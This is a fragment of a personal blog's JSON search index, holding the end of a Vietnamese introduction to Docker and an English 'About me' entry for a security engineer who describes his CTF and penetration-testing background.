sudo netstat -lntp | grep dockerd Thêm nhiều cấu hình khác\n","description":"Docker là nền tảng mở (open platform) để phát triển (developing), vận chuyển (shipping) hoặc chạy (running) các ứng dụng.","id":26,"section":"posts","tags":["Docker"],"title":"Tìm hiểu về docker","uri":"https://minhlongmt183.github.io/posts/docker_overview/"},{"content":"About me\nHi, I\u0026rsquo;m Long Vo Minh, also known as edisc, and I am a passionate cybersecurity researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on binary-related challenges (RE-PWN).\nCurrently, I work at ZaloPay as an Associate Security Engineer responsible for penetration testing of infrastructure systems, including on-premises servers and cloud computing services such as AWS and Kubernetes.\nIn addition, I have knowledge of web pen-testing and am currently studying basic security vulnerabilities such as IDOR, XSS, SQLI, and SSRF.\nRecently, I have been glad to be a mentor for talented students at the BKISC club who share the same passion for cybersecurity. I hope to inspire and support the next generation of Bach Khoa security professionals.\n","description":"Edisc","id":28,"section":"","tags":null,"title":"Edisc","uri":"https://minhlongmt183.github.io/about/"}]